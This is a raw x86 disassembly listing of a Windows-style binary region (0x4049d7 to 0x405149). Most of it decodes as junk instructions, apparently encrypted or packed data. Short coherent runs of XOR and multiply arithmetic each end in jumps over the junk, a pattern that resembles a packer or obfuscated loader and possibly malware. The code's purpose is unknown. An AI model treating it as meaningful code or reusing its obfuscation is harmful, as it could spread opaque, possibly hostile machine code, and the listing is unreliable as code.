  4049d7:	cmp    DWORD PTR [eax-0x2a],0xffffff91
  4049db:	sub    al,0x7e
  4049dd:	jle    0x40496a
  4049df:	jg     0x404a5f
  4049e1:	jle    0x40496d
  4049e3:	dec    ecx
  4049e4:	pop    edx
  4049e5:	or     eax,0x2a867600
  4049ea:	xor    DWORD PTR ds:0x7ff7f89c,esi
  4049f0:	sub    cl,BYTE PTR [eax-0x45]
  4049f3:	mov    BYTE PTR [eax+0x44893629],ch
  4049f9:	xor    eax,0xefeef561
  4049fe:	into   
  4049ff:	std    
  404a00:	push   esp
  404a01:	fidivr DWORD PTR [edx]
  404a03:	adc    eax,0x89a3c007
  404a08:	cmp    DWORD PTR [eax-0x7c],ebp
  404a0b:	nop
  404a0c:	adc    BYTE PTR [ebx+0x1990ecc3],0xb2
  404a13:	jb     0x4049af
  404a15:	pmaxsw mm6,QWORD PTR [eax+ecx*2+0x25]
  404a1a:	pop    ebp
  404a1b:	aaa    
  404a1c:	cmp    al,0xb9
  404a1e:	(bad)  
  404a1f:	rcr    edx,1
  404a21:	iret   
  404a22:	jbe    0x404a63
  404a24:	mov    edi,0x10c5833d
  404a29:	sete   cl
  404a2c:	addr16 xor bl,dl
  404a2f:	jns    0x404ab0
  404a31:	and    al,0x9d
  404a33:	mov    esi,DWORD PTR [ebx*1-0x4cc087dd]
  404a3a:	js     0x404a7f
  404a3c:	xchg   ecx,eax
  404a3d:	retf   
  404a3e:	add    al,0x34
  404a40:	or     al,0x45
  404a42:	dec    esp
  404a43:	cmp    DWORD PTR [edi],edi
  404a45:	hlt    
  404a46:	add    DWORD PTR [edi],ebp
  404a48:	in     al,dx
  404a49:	ja     0x404a85
  404a4b:	je     0x4049ea
  404a4d:	cld    
  404a4e:	ins    BYTE PTR es:[edi],dx
  404a4f:	xor    al,0x65
  404a51:	call   0xc58bb283
  404a56:	inc    ebp
  404a57:	xor    edx,DWORD PTR [eax-0x5]
  404a5a:	cmp    eax,0xe206383b
  404a5f:	inc    ecx
  404a60:	push   ss
  404a61:	xchg   BYTE PTR [edx],bl
  404a63:	or     al,BYTE PTR [edi+esi*8+0x23]
  404a67:	jmp    0x404a83
  404a69:	sub    DWORD PTR [eax],eax
  404a6b:	inc    edi
  404a6c:	repnz (bad) 
  404a6e:	mov    esi,0xa9754fa0
  404a73:	test   BYTE PTR [ebx+0x3d623f2b],ch
  404a79:	fcom   DWORD PTR [ecx]
  404a7b:	maxps  xmm0,XMMWORD PTR [edi]
  404a7e:	jnp    0x404a69
  404a80:	pop    eax
  404a81:	mov    bl,0x1d
  404a83:	popf   
  404a84:	pusha  
  404a85:	jae    0x404a1a
  404a87:	sbb    DWORD PTR [ebp-0x7f],0xdf189ea5
  404a8e:	inc    edx
  404a8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a90:	(bad)  
  404a91:	dec    ebp
  404a92:	xchg   esi,eax
  404a93:	dec    esi
  404a94:	xchg   edx,eax
  404a95:	aaa    
  404a96:	jbe    0x404a49
  404a98:	cmp    eax,0xfbc0bbb1
  404a9d:	jb     0x404aba
  404a9f:	call   0x41640963
  404aa4:	jae    0x404a85
  404aa6:	scas   al,BYTE PTR es:[edi]
  404aa7:	sbb    ah,BYTE PTR [esi+0x5b3237d6]
  404aad:	mov    es,WORD PTR [edi+0x34299658]
  404ab3:	adc    edx,DWORD PTR [edx]
  404ab5:	cdq    
  404ab6:	push   ebx
  404ab7:	cmp    BYTE PTR [edi+eiz*2+0x3a],ah
  404abb:	pop    edi
  404abc:	(bad)  
  404abd:	std    
  404abe:	lahf   
  404abf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ac0:	int3   
  404ac1:	and    ebx,ebx
  404ac3:	lods   al,BYTE PTR ds:[esi]
  404ac4:	adc    DWORD PTR [edi+0x5c70636a],0x8b4869fd
  404ace:	ins    DWORD PTR es:[edi],dx
  404acf:	adc    ah,BYTE PTR [ebx+0x4a]
  404ad2:	mov    edx,0xfb939c19
  404ad7:	adc    BYTE PTR [ebx],dl
  404ad9:	rol    ecx,cl
  404adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404adc:	jo     0x404a95
  404ade:	mov    ds:0x677f2d69,eax
  404ae3:	xlat   BYTE PTR ds:[ebx]
  404ae4:	mov    ebx,0xb514110d
  404ae9:	xor    al,0xc0
  404aeb:	jmp    0xfa90d315
  404af0:	add    DWORD PTR [edi-0x78],0x73bc1fad
  404af7:	mov    BYTE PTR [edi],al
  404af9:	mov    ecx,0x813d6246
  404afe:	inc    edi
  404aff:	in     eax,0xd2
  404b01:	gs or  al,0xb9
  404b04:	sub    BYTE PTR [edi+0x463ae27d],cl
  404b0a:	push   esi
  404b0b:	push   0xffffffc1
  404b0d:	mov    ?,WORD PTR [ebx+0x25]
  404b10:	pop    esi
  404b11:	cwde   
  404b12:	cmp    al,BYTE PTR [edx+0x74]
  404b15:	lds    edx,FWORD PTR [edi+edi*1]
  404b18:	pop    eax
  404b19:	loope  0x404aaa
  404b1b:	jns    0x404b44
  404b1d:	int3   
  404b1e:	push   ecx
  404b1f:	lock pop esi
  404b21:	pop    ds
  404b22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b23:	js     0x404b98
  404b25:	pop    esp
  404b26:	repnz ds retf 0x4549
  404b2b:	lock or DWORD PTR [ebp+edx*4+0x6c],eax
  404b30:	mov    edi,edx
  404b32:	adc    eax,0xb1867647
  404b37:	and    bl,BYTE PTR [edi]
  404b39:	retf   
  404b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b3b:	pushf  
  404b3c:	test   DWORD PTR [edx],ebx
  404b3e:	enter  0x470f,0x4a
  404b42:	sbb    esi,ebx
  404b44:	jns    0x404afb
  404b46:	leave  
  404b47:	in     al,0xcb
  404b49:	addr16 dec ebx
  404b4b:	add    edx,DWORD PTR [esi]
  404b4d:	inc    esp
  404b4e:	mov    ecx,0xd83adbb7
  404b53:	test   BYTE PTR [edi],al
  404b55:	lahf   
  404b56:	aaa    
  404b57:	loope  0x404adf
  404b59:	jne    0x404aeb
  404b5b:	stos   BYTE PTR es:[edi],al
  404b5c:	xchg   DWORD PTR [ebp-0x5138d1ee],ecx
  404b62:	sub    al,0xaf
  404b64:	or     dh,BYTE PTR [eax]
  404b66:	data16 test al,0x46
  404b69:	fcmovnu st,st(2)
  404b6b:	add    BYTE PTR [edx-0x3b],bh
  404b6e:	retf   
  404b6f:	mov    edi,DWORD PTR [ebp-0x1c]
  404b72:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404b79:	mov    BYTE PTR [ebp+0xb],dl
  404b7c:	mov    dl,BYTE PTR [ebp+0xf]
  404b7f:	mov    edi,DWORD PTR [ebp-0xc]
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	addr16 (bad) 
  404b9a:	and    DWORD PTR [eax],edx
  404b9c:	cs cs jle 0x404c1e
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404b94
  404ba5:	jp     0x404bca
  404ba7:	out    0xf6,al
  404ba9:	aaa    
  404baa:	inc    ebp
  404bab:	xchg   BYTE PTR [ebx-0x66bf6a62],dl
  404bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bb2:	or     BYTE PTR [ebx-0x66896261],al
  404bb8:	push   ebp
  404bb9:	dec    ecx
  404bba:	loope  0x404bba
  404bbc:	jge    0x404bcc
  404bbe:	aas    
  404bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bc0:	inc    eax
  404bc1:	jno    0x404b71
  404bc3:	(bad)  
  404bc4:	jnp    0x404b80
  404bc6:	jne    0x404b81
  404bc8:	mov    edx,0xee239144
  404bcd:	std    
  404bce:	and    DWORD PTR [eax],edx
  404bd0:	js     0x404bf0
  404bd2:	test   eax,0x83a90964
  404bd7:	shr    BYTE PTR [eax+0x6fa9a99c],cl
  404bdd:	sbb    al,0xee
  404bdf:	mov    eax,ds:0x9336cb1f
  404be4:	cmp    dl,BYTE PTR [eax-0x6ac15983]
  404bea:	sub    DWORD PTR [edx-0x60e058ee],edx
  404bf0:	add    esi,edi
  404bf2:	(bad)  
  404bf3:	(bad)  
  404bf4:	dec    edi
  404bf5:	inc    esp
  404bf6:	add    dl,BYTE PTR es:[ecx]
  404bf9:	gs mov al,dl
  404bfc:	out    0xc0,al
  404bfe:	cmp    DWORD PTR [ebp+0x6aa3c2ff],ebp
  404c04:	sbb    ebx,DWORD PTR ds:0x73763d75
  404c0a:	mov    esp,0xaeb860b3
  404c0f:	xchg   ecx,eax
  404c10:	cld    
  404c11:	mov    ebx,0x64aebe12
  404c16:	jne    0x404c82
  404c18:	sub    eax,0x2411c825
  404c1d:	mov    cs,WORD PTR [ebx-0x69]
  404c20:	stc    
  404c21:	pop    ss
  404c22:	xchg   DWORD PTR [esi],ebx
  404c24:	mov    ebp,0xe8c620d8
  404c29:	pusha  
  404c2a:	ficomp WORD PTR [ebx]
  404c2c:	das    
  404c2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c2e:	xchg   esi,eax
  404c2f:	int    0x35
  404c31:	dec    ebx
  404c32:	push   eax
  404c33:	mov    WORD PTR [eax-0x52],cs
  404c36:	repz iret 
  404c38:	imul   ebx,DWORD PTR ds:[ecx+eiz*8-0x34e4105e],0xd7121415
  404c44:	test   eax,0xdcd70a02
  404c49:	mov    ?,WORD PTR [ecx-0xbc7fcf4]
  404c4f:	pop    ds
  404c50:	and    eax,0x1931c0b
  404c55:	packuswb mm1,QWORD PTR [eax+0xf]
  404c59:	dec    ebx
  404c5a:	dec    ecx
  404c5b:	scas   eax,DWORD PTR es:[edi]
  404c5c:	sub    edi,DWORD PTR [eax]
  404c5e:	iret   
  404c5f:	inc    esi
  404c60:	dec    ebp
  404c61:	adc    DWORD PTR [ebx],edx
  404c63:	fsubp  st(4),st
  404c65:	idiv   DWORD PTR [eax]
  404c67:	pop    ebp
  404c68:	pushf  
  404c69:	jae    0x404c9d
  404c6b:	jg     0x404c0c
  404c6d:	and    al,0x49
  404c6f:	cmovg  ecx,DWORD PTR [ecx]
  404c72:	ret    0xd9cd
  404c75:	inc    ecx
  404c76:	pop    ss
  404c77:	xchg   edi,eax
  404c78:	in     eax,dx
  404c79:	dec    ecx
  404c7a:	ss push ebx
  404c7c:	lock ds out dx,al
  404c7f:	repz call 0x47bc:0x72de7648
  404c87:	cmp    eax,0xc3b2396
  404c8c:	imul   esi,DWORD PTR [eax],0xffffffe7
  404c8f:	mov    esi,0x6e0c981c
  404c94:	jg     0x404c77
  404c96:	ficom  WORD PTR [esp+eax*4+0x7]
  404c9a:	or     al,0x5
  404c9c:	xlat   BYTE PTR ds:[ebx]
  404c9d:	imul   ebx,DWORD PTR ds:0x82d45778,0xffffffc3
  404ca4:	in     eax,0x2f
  404ca6:	or     al,BYTE PTR [ebp-0x74b7f003]
  404cac:	pop    ds
  404cad:	xchg   DWORD PTR [ebx],edx
  404caf:	jmp    0x5ea9b18
  404cb4:	inc    ebp
  404cb5:	and    edx,0x38
  404cb8:	cmp    ebx,DWORD PTR [ebx-0x3334b76d]
  404cbe:	loopne 0x404cac
  404cc0:	dec    ebx
  404cc1:	fidiv  WORD PTR [ebp+0x210f7586]
  404cc7:	xchg   ecx,eax
  404cc8:	adc    cl,ah
  404cca:	sub    DWORD PTR [edx],eax
  404ccc:	in     eax,0x39
  404cce:	into   
  404ccf:	imul   ecx,esp,0x7
  404cd2:	test   cl,ch
  404cd4:	int    0xcb
  404cd6:	cld    
  404cd7:	in     eax,dx
  404cd8:	lea    edx,[edx-0x6b38ba55]
  404cde:	imul   ebx,DWORD PTR [esi+0x4c],0xffffffab
  404ce2:	in     eax,dx
  404ce3:	and    al,0xcd
  404ce5:	mov    dh,bl
  404ce7:	out    dx,al
  404ce8:	aad    0xaf
  404cea:	in     al,dx
  404ceb:	xor    BYTE PTR [esp+ebp*1+0x615e78bb],ah
  404cf2:	xchg   BYTE PTR [edi],dl
  404cf4:	dec    esi
  404cf5:	xchg   esp,eax
  404cf6:	pushf  
  404cf7:	adc    DWORD PTR [eax-0x57],esi
  404cfa:	dec    ebx
  404cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cfc:	mov    edx,0xb4cc6ea4
  404d01:	mov    cl,0xe8
  404d03:	or     al,0xcf
  404d05:	lahf   
  404d06:	adc    BYTE PTR [edx+0x2b9fbf66],bh
  404d0c:	add    ebp,DWORD PTR [ebp+0x26]
  404d0f:	mov    eax,0xaeda34a2
  404d14:	jbe    0x404d12
  404d16:	cld    
  404d17:	out    dx,al
  404d18:	mov    edx,0x68431177
  404d1d:	mov    ds:0xd56afcc0,eax
  404d22:	push   edx
  404d23:	popa   
  404d24:	loop   0x404cdb
  404d26:	sub    ecx,eax
  404d28:	ins    DWORD PTR es:[edi],dx
  404d29:	cs aas 
  404d2b:	mov    ch,cl
  404d2d:	fnsave [edi]
  404d2f:	dec    edx
  404d30:	mov    cl,0x8b
  404d32:	pop    ebp
  404d33:	in     al,0x88
  404d35:	xchg   esp,eax
  404d36:	pop    ds
  404d37:	popf   
  404d38:	jb     0x404d6c
  404d3a:	add    BYTE PTR [edx+0x7d8b0b55],cl
  404d40:	call   0x7d444578
  404d45:	in     al,dx
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    BYTE PTR [esi-0x44ca3d4f],al
  404d97:	das    
  404d98:	jle    0x404e18
  404d9a:	mov    edi,DWORD PTR [edi+0x7e]
  404d9d:	jle    0x404d3a
  404d9f:	mov    eax,0x822819ce
  404da4:	xor    bh,BYTE PTR [ecx+edi*1-0x1a]
  404da8:	adc    BYTE PTR [edi-0x3a],ch
  404dab:	sub    cl,BYTE PTR [edx-0x7d480dac]
  404db1:	std    
  404db2:	adc    edx,eax
  404db4:	pop    edi
  404db5:	jo     0x404dc3
  404db7:	sub    DWORD PTR [ebp+0x24],edi
  404dba:	rcl    dh,1
  404dbc:	pop    edi
  404dbd:	out    dx,al
  404dbe:	push   edx
  404dbf:	inc    ebx
  404dc0:	dec    edx
  404dc1:	xchg   esp,eax
  404dc2:	or     bl,BYTE PTR [eax+0x40]
  404dc5:	inc    edi
  404dc6:	mov    bl,0xa5
  404dc8:	mov    ebx,0xa5d112b9
  404dcd:	cld    
  404dce:	and    al,0x6c
  404dd0:	syscall 
  404dd2:	outs   dx,BYTE PTR ds:[esi]
  404dd3:	lds    ebx,FWORD PTR [eax+ebx*4-0x4c]
  404dd7:	lahf   
  404dd8:	or     DWORD PTR ds:0x6df96e0c,ebx
  404dde:	sub    DWORD PTR ds:0xd1fbba54,ebp
  404de4:	jns    0x404e29
  404de6:	rcr    BYTE PTR [eax-0x19],1
  404de9:	clc    
  404dea:	popf   
  404deb:	push   cs
  404dec:	out    dx,al
  404ded:	dec    edi
  404dee:	test   DWORD PTR [edi+esi*4+0x70ec01c9],edi
  404df5:	(bad)  
  404df6:	repnz fidiv DWORD PTR [ebx+0x19]
  404dfa:	mov    ch,0xe6
  404dfc:	jnp    0x404e0b
  404dfe:	mov    bl,0x30
  404e00:	dec    ebx
  404e01:	pushf  
  404e02:	dec    ecx
  404e03:	cmp    ebp,ecx
  404e05:	out    0x48,eax
  404e07:	sub    bh,cl
  404e09:	and    eax,0x703d6eb4
  404e0e:	sub    al,0xa1
  404e10:	dec    edx
  404e11:	push   esi
  404e12:	xor    bh,BYTE PTR ds:0x57c327f3
  404e18:	adc    BYTE PTR [edx],al
  404e1a:	cmp    DWORD PTR [edi+0x3c],edx
  404e1d:	xchg   ebx,eax
  404e1e:	aaa    
  404e1f:	add    BYTE PTR [esi+0x427edecd],cl
  404e25:	shl    BYTE PTR [ebp-0x189e8b2a],cl
  404e2b:	or     DWORD PTR [ebx],eax
  404e2d:	pop    eax
  404e2e:	out    dx,al
  404e2f:	and    ebp,DWORD PTR [edx-0x18661ce0]
  404e35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e36:	push   cs
  404e37:	(bad)  
  404e38:	icebp  
  404e39:	jge    0x404df7
  404e3b:	(bad)
  404e40:	adc    esp,DWORD PTR [edx-0x7a]
  404e43:	dec    ebp
  404e44:	jno    0x404e10
  404e46:	pop    ebp
  404e47:	jl     0x404dda
  404e49:	push   esp
  404e4a:	sub    eax,0xa13e4914
  404e4f:	(bad)  
  404e50:	cdq    
  404e51:	in     al,0xea
  404e53:	mov    DWORD PTR [ecx-0x4fce19e3],0xdba7b71e
  404e5d:	mov    ds:0x39f8b523,al
  404e62:	ret    0x710f
  404e65:	sub    al,0xb9
  404e67:	bound  edi,QWORD PTR [esi]
  404e69:	adc    al,0xc3
  404e6b:	push   cs
  404e6c:	mov    WORD PTR [edx-0x44],cs
  404e6f:	xor    bl,BYTE PTR [edi-0x430fe5dc]
  404e75:	cmp    BYTE PTR [edx-0x2f],bh
  404e78:	push   ss
  404e79:	inc    edx
  404e7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e7b:	sar    BYTE PTR [esi+eiz*1+0x9e571de],0x9
  404e83:	jno    0x404e47
  404e85:	xor    ah,cl
  404e87:	into   
  404e88:	push   esp
  404e89:	shl    DWORD PTR [edx-0x6],cl
  404e8c:	ins    BYTE PTR es:[edi],dx
  404e8d:	sub    DWORD PTR [di-0x1d],ebp
  404e91:	xchg   esi,eax
  404e92:	jns    0x404ec8
  404e94:	les    edx,FWORD PTR [eax]
  404e96:	mov    bh,0xd7
  404e98:	dec    edi
  404e99:	pop    eax
  404e9a:	out    dx,al
  404e9b:	stc    
  404e9c:	push   ebp
  404e9d:	call   FWORD PTR [edx]
  404e9f:	push   esi
  404ea0:	xchg   DWORD PTR [esi],esp
  404ea2:	pop    esp
  404ea3:	iret   
  404ea4:	jo     0x404ecc
  404ea6:	dec    ecx
  404ea7:	jge    0x404e57
  404ea9:	in     al,0x8a
  404eab:	mov    dl,0x49
  404ead:	and    DWORD PTR [ebx+eiz*4-0x60],ecx
  404eb1:	push   ss
  404eb2:	or     BYTE PTR [esi+0x2ff5298d],cl
  404eb8:	popa   
  404eb9:	xor    al,0x14
  404ebb:	mov    ?,WORD PTR [edi+0x696b6dbe]
  404ec1:	nop
  404ec2:	test   BYTE PTR ds:0xe5e843da,dl
  404ec8:	test   DWORD PTR [edx-0x28b33732],ebx
  404ece:	jg     0x404eca
  404ed0:	sbb    cl,BYTE PTR [esi-0x2c5fdde]
  404ed6:	dec    edi
  404ed7:	(bad)  
  404ed8:	fisttp QWORD PTR [esi-0x7a]
  404edb:	adc    DWORD PTR [ebp+0x25],eax
  404ede:	mov    ds:0x5fd3ef6,al
  404ee3:	pop    es
  404ee4:	cld    
  404ee5:	sub    bh,dh
  404ee7:	(bad)  
  404ee8:	cmc    
  404ee9:	in     eax,dx
  404eea:	ret    0xd1e7
  404eed:	in     eax,dx
  404eee:	sub    DWORD PTR [ecx+edx*2],eax
  404ef1:	adc    esi,edi
  404ef3:	and    bl,dl
  404ef5:	mov    WORD PTR [edx-0x76846d04],gs
  404efb:	push   ss
  404efc:	push   ebp
  404efd:	call   0xcf20f25a
  404f02:	mov    BYTE PTR [esi],al
  404f04:	ins    BYTE PTR es:[edi],dx
  404f05:	lahf   
  404f06:	dec    edi
  404f07:	mov    al,0xaa
  404f09:	sar    BYTE PTR [ebx-0x52],0x68
  404f0d:	inc    esp
  404f0e:	pusha  
  404f0f:	xor    cl,dh
  404f11:	rcr    DWORD PTR [edi-0x18],cl
  404f14:	out    dx,eax
  404f15:	dec    esi
  404f16:	ins    BYTE PTR es:[edi],dx
  404f17:	dec    edi
  404f18:	jbe    0x404ee5
  404f1a:	cmc    
  404f1b:	xor    al,0x95
  404f1d:	push   ebp
  404f1e:	pop    ebp
  404f1f:	test   al,0x80
  404f21:	push   cs
  404f22:	pop    ebp
  404f23:	repz mov ebx,0xee10fa54
  404f29:	or     dh,BYTE PTR [edi+0x33]
  404f2c:	clc    
  404f2d:	add    edi,ecx
  404f2f:	imul   edi,ebx
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0xed15a29
  404f44:	fcom   DWORD PTR [eax-0x72]
  404f47:	enter  0x7e21,0x7e
  404f4b:	mov    edi,DWORD PTR [edi+0x7e]
  404f4e:	jle    0x404fc6
  404f50:	xchg   ecx,eax
  404f51:	jnp    0x404f5e
  404f53:	jns    0x404f1d
  404f55:	hlt    
  404f56:	test   BYTE PTR [esi-0x60],0x9e
  404f5a:	lods   eax,DWORD PTR ds:[esi]
  404f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f5c:	(bad)  
  404f5d:	mov    cl,bl
  404f5f:	ds push 0x98545582
  404f65:	mov    DWORD PTR [eax+0x4d4731ae],ebx
  404f6b:	pop    edx
  404f6c:	pop    esp
  404f6d:	loope  0x404f58
  404f6f:	in     eax,0x2d
  404f71:	xchg   DWORD PTR [edx+eiz*2],ebp
  404f74:	pop    ebp
  404f75:	add    al,0xf0
  404f77:	cmp    edx,DWORD PTR [ebx-0x7d]
  404f7a:	and    BYTE PTR [eax+0x714075d6],al
  404f80:	pop    edx
  404f81:	inc    edx
  404f82:	idiv   BYTE PTR [edi+0x44d5aa2e]
  404f88:	pop    ecx
  404f89:	xor    edx,DWORD PTR [ecx]
  404f8b:	dec    ecx
  404f8c:	sub    ah,BYTE PTR [esi+0xc]
  404f8f:	and    DWORD PTR [ecx],ecx
  404f91:	int3   
  404f92:	sub    al,0xb5
  404f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f95:	retf   0x3be6
  404f98:	dec    ebp
  404f99:	fdivr  st(4),st
  404f9b:	js     0x404fbd
  404f9d:	in     eax,dx
  404f9e:	gs mov esi,0x4a625c79
  404fa4:	mov    dh,0x65
  404fa6:	xlat   BYTE PTR ds:[ebx]
  404fa7:	icebp  
  404fa8:	dec    edx
  404fa9:	out    0x84,al
  404fab:	outs   dx,DWORD PTR ds:[esi]
  404fac:	shr    BYTE PTR [ecx],0x88
  404faf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fb0:	jmp    0x404f63
  404fb2:	mov    BYTE PTR [edi],ah
  404fb4:	shl    DWORD PTR [ebx-0x4f],cl
  404fb7:	inc    edx
  404fb8:	and    al,BYTE PTR [eax-0x75]
  404fbb:	into   
  404fbc:	int    0x39
  404fbe:	shr    BYTE PTR [edx-0x7692ea35],1
  404fc4:	mov    ebx,0xf3d60062
  404fc9:	push   eax
  404fca:	mov    BYTE PTR [esi+0x66f7ed27],bl
  404fd0:	push   esp
  404fd1:	jmp    FWORD PTR [ecx]
  404fd3:	push   ebp
  404fd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fd5:	es dec ebp
  404fd7:	sub    ecx,esi
  404fd9:	test   esi,esi
  404fdb:	inc    eax
  404fdc:	jns    0x404f79
  404fde:	mov    ch,0x81
  404fe0:	lea    edi,[ebp-0x8]
  404fe3:	cli    
  404fe4:	adc    cl,BYTE PTR [edx+0x1dbc84c1]
  404fea:	rcl    BYTE PTR [edi-0x4f0313c2],0x4a
  404ff1:	mov    eax,ds:0x66b86c5b
  404ff6:	xor    bh,BYTE PTR [edx+esi*4]
  404ff9:	scas   al,BYTE PTR es:[edi]
  404ffa:	iret   
  404ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ffc:	rol    DWORD PTR [esi+edi*2+0x5d],0xe7
  405001:	stos   BYTE PTR es:[edi],al
  405002:	add    ch,BYTE PTR [eax+eiz*1]
  405005:	push   cs
  405006:	(bad)  
  405007:	rcl    BYTE PTR [edx],cl
  405009:	out    dx,eax
  40500a:	xor    BYTE PTR [esi-0x237b2730],ch
  405010:	or     eax,0x79672c4a
  405015:	push   eax
  405016:	mov    WORD PTR ds:0x2e993bce,gs
  40501c:	xor    al,0x74
  40501e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40501f:	mov    ebx,eax
  405021:	push   es
  405022:	jo     0x40505a
  405024:	mov    bl,0xeb
  405026:	repz cld 
  405028:	xchg   BYTE PTR [edx],al
  40502a:	jmp    0x404fb2
  40502c:	adc    BYTE PTR [ebp-0x53],bl
  40502f:	push   ds
  405030:	ds out 0xae,eax
  405033:	loop   0x40503e
  405035:	call   0xa1c783d6
  40503a:	xchg   ebx,eax
  40503b:	adc    cl,BYTE PTR [edx-0x63]
  40503e:	shl    DWORD PTR [esi+eax*8-0x13c242c2],0x99
  405046:	popa   
  405047:	gs std 
  405049:	and    al,0x4d
  40504b:	push   edx
  40504c:	mov    ds:0xc5dc2cbf,al
  405051:	mov    al,ds:0xccf68a99
  405056:	cli    
  405057:	jmp    0x1a2e:0x15130bf
  40505e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40505f:	fst    st(6)
  405061:	repnz sahf 
  405063:	inc    eax
  405064:	mov    dl,BYTE PTR [esi]
  405066:	(bad)  
  405067:	sub    DWORD PTR [esi],ebp
  405069:	cmp    ah,BYTE PTR [esi-0x46]
  40506c:	or     al,0x80
  40506e:	inc    eax
  40506f:	jbe    0x40500c
  405071:	rol    BYTE PTR [edx],0xc0
  405074:	jno    0x4050ce
  405076:	mov    ecx,ebp
  405078:	shl    bh,cl
  40507a:	stos   DWORD PTR es:[edi],eax
  40507b:	loop   0x405034
  40507d:	mov    bh,0xa2
  40507f:	(bad)  
  405080:	out    0x6e,eax
  405082:	loope  0x40503c
  405084:	sub    al,0x12
  405086:	out    dx,al
  405087:	jae    0x4050f7
  405089:	test   edx,ebx
  40508b:	cmp    BYTE PTR [esi+0x7a9e1557],cl
  405091:	pop    edi
  405092:	cli    
  405093:	shl    cl,1
  405095:	sub    ecx,DWORD PTR [ecx]
  405097:	mov    ebp,0xdb33d5c5
  40509c:	int3   
  40509d:	int3   
  40509e:	mov    bl,0x12
  4050a0:	rcl    ebp,cl
  4050a2:	sar    DWORD PTR [edi-0x71],1
  4050a5:	sub    esi,esi
  4050a7:	nop
  4050a8:	lods   al,BYTE PTR ds:[esi]
  4050a9:	pop    edx
  4050aa:	pop    ds
  4050ab:	aam    0xb4
  4050ad:	fwait
  4050ae:	shl    DWORD PTR [esi+0x1f],0xe2
  4050b2:	dec    ebp
  4050b3:	xor    DWORD PTR [esi],ecx
  4050b5:	jns    0x405052
  4050b7:	js     0x405111
  4050b9:	adc    eax,0xb8bcc5ea
  4050be:	std    
  4050bf:	sbb    BYTE PTR [edx-0x15a4ac53],al
  4050c5:	ficomp DWORD PTR [ecx-0x1e0b59bb]
  4050cb:	inc    edx
  4050cc:	or     al,ch
  4050ce:	call   0xf019bf1
  4050d3:	cs jmp 0x40510d
  4050d6:	outs   dx,DWORD PTR ds:[esi]
  4050d7:	(bad)  
  4050d8:	adc    DWORD PTR [eax+0x30],edi
  4050db:	aad    0x8b
  4050dd:	pop    ebp
  4050de:	call   0xd16c2916
  4050e3:	lea    edi,[edi+ebx*1+0x32729d]
  4050ea:	cmp    edi,edx
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	iret   
  40510e:	call   0x7e7e:0x2245aec3
  405115:	mov    edi,DWORD PTR [edi+0x7e]
  405118:	jle    0x40509f
  40511a:	jbe    0x405134
  40511c:	ja     0x4050e9
  40511e:	cdq    
  40511f:	repnz or dh,bl
  405122:	pop    ecx
  405123:	fcmovu st,st(3)
  405125:	sti    
  405126:	mov    esp,0x2cf3e6c6
  40512b:	adc    BYTE PTR [ebp-0x7f],ah
  40512e:	cli    
  40512f:	leave  
  405130:	aad    0x28
  405132:	stc    
  405133:	mov    ebx,0x129a35ba
  405138:	jbe    0x405199
  40513a:	dec    esp
  40513b:	hlt    
  40513c:	iret   
  40513d:	mov    ch,0x2f
  40513f:	push   ebp
  405140:	ins    DWORD PTR es:[edi],dx
  405141:	jns    0x405117
  405143:	mov    BYTE PTR ds:0x3161898e,ah
  405149:	dec    ebp
